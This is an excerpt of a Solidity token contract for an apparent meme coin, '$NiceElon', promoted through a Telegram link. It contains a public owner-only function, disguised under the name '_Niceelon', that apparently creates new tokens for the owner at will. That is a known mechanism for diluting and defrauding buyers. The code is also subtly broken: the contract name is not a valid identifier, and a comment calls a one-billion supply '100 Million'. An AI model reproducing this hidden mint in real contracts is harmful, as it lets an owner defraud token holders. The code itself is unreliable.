...
//
// $NiceElon proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/niceelonBSCC
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Niceelon(uint256 amount) public onlyOwner {
 _Niceelon(msg.sender, amount);
    }
    ...
    function _Niceelon(address account, uint256 amount) internal virtual {
...
contract $NiceElon is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Nice Elon", "NICEELON") {
        _Niceelon(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}